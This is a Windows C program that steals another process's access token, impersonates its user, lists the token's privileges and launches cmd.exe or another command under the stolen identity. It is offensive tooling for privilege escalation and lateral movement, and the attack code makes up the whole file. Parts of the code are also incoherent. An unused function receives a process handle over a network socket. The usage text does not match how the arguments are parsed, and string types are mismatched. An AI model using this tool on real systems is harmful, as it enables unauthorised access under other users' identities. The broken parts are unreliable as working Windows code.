#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <UserEnv.h>
#include <winsock2.h> // Include for networking functions
#include <ws2tcpip.h> // Include for networking functions
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ws2_32.lib") // Linking library for Winsock API

void LogError(const char* message) {
    FILE* logFile = fopen("error_log.txt", "a");
    if (logFile) {
        fprintf(logFile, "%s Error code: %d\n", message, GetLastError());
        fclose(logFile);
    }
}

void ListTokenPrivileges(HANDLE tokenHandle) {
    DWORD dwLength = 0;
    if (!GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &dwLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("GetTokenInformation() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        return;
    }

    PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, dwLength);
    if (!pTokenPrivileges) {
        printf("GlobalAlloc() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        return;
    }

    if (!GetTokenInformation(tokenHandle, TokenPrivileges, pTokenPrivileges, dwLength, &dwLength)) {
        printf("GetTokenInformation() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        GlobalFree(pTokenPrivileges);
        return;
    }

    printf("Token Privileges:\n");
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        LUID luid = pTokenPrivileges->Privileges[i].Luid;
        TCHAR szName[256];
        DWORD dwSize = sizeof(szName)/sizeof(szName[0]);
        if (LookupPrivilegeName(NULL, &luid, szName, &dwSize)) {
            printf("  %s\n", szName);
        }
    }

    GlobalFree(pTokenPrivileges);
}

HANDLE OpenRemoteProcess(const char* ipAddress, DWORD pid) {
    // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return NULL;
    }

    // Resolve IP address
    struct addrinfo* result = NULL;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(ipAddress, "0", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return NULL;
    }

    // Connect to server
    SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return NULL;
    }

    iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("Unable to connect to server: %ld\n", WSAGetLastError());
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
        freeaddrinfo(result);
        WSACleanup();
        return NULL;
    }

    freeaddrinfo(result);

    // Send PID to remote server and receive handle
    HANDLE hRemoteProcess = NULL;
    iResult = send(ConnectSocket, (char*)&pid, sizeof(pid), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return NULL;
    }

    iResult = recv(ConnectSocket, (char*)&hRemoteProcess, sizeof(HANDLE), 0);
    if (iResult <= 0) {
        printf("recv failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return NULL;
    }

    // Clean up and return handle
    closesocket(ConnectSocket);
    WSACleanup();
    return hRemoteProcess;
}

int main(int argc, char* argv[]) {
    int pid_to_impersonate = 0;
    const wchar_t* command_to_run = L"C:\\Windows\\System32\\cmd.exe";
    
    // Command-line argument parsing
    if (argc >= 4) {
        pid_to_impersonate = atoi(argv[1]);
        command_to_run = argv[2];
    } else {
        printf("Usage: %s <ip_address> <pid> <command>\n", argv[0]);
        return -1;
    }

    // Open the target process and get its token.
    HANDLE rProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_to_impersonate);
    if (!rProc) {
        printf("OpenProcess() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        return -1;
    }

    HANDLE TokenHandle = NULL;
    if (!OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle)) {
        printf("OpenProcessToken() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        CloseHandle(rProc);
        return -1;
    }

    // Impersonate the user of the token.
    if (!ImpersonateLoggedOnUser(TokenHandle)) {
        printf("ImpersonateLoggedOnUser() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        CloseHandle(TokenHandle);
        CloseHandle(rProc);
        return -1;
    }

    // List token privileges
    ListTokenPrivileges(TokenHandle);

    // Duplicate the token and create a new process with it.
    HANDLE DuplicateTokenHandle = NULL;
    if (!DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle)) {
        printf("DuplicateTokenEx() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        RevertToSelf();
        CloseHandle(TokenHandle);
        CloseHandle(rProc);
        return -1;
    }

    // Start a new process using the duplicated token.
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);

    if (!CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, command_to_run, NULL, 0, NULL, NULL, &startupInfo, &processInformation)) {
        printf("CreateProcessWithTokenW() Failed ;(\n");
        printf("Error code : %d\n", GetLastError());
        RevertToSelf();
        CloseHandle(DuplicateTokenHandle);
        CloseHandle(TokenHandle);
        CloseHandle(rProc);
        return -1;
    }

    // Clean up
    CloseHandle(processInformation.hProcess);
    CloseHandle(processInformation.hThread);
    CloseHandle(DuplicateTokenHandle);
    RevertToSelf();
    CloseHandle(TokenHandle);
    CloseHandle(rProc);

    return 0;
}
